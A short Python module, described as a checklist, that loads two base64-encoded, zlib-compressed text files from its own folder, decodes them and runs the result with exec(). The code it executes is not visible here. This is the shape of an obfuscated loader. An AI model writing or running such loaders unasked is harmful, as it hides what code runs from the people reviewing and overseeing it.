"""Part A+B1 checklist with A15 — zlib parts on disk."""
from __future__ import annotations
import base64
import zlib
from pathlib import Path

_dir = Path(__file__).resolve().parent
_b64 = (_dir / "_ab_z1.txt").read_text() + (_dir / "_ab_z2.txt").read_text()
_src = zlib.decompress(base64.b64decode(_b64)).decode()
exec(compile(_src, __file__, "exec"), globals())
